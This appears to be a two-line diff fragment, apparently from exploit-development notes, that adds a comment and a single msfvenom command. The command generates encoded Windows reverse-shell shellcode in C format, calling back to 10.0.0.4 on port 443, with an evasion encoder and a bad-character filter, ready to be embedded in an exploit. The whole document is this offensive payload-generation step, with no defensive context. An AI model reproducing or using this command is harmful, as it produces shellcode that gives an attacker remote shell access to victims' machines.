@@ -1,0 +1,2 @@
+# Generate an encoded reverse_tcp payload and prevents the application from crashing with the "thread" exit function
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
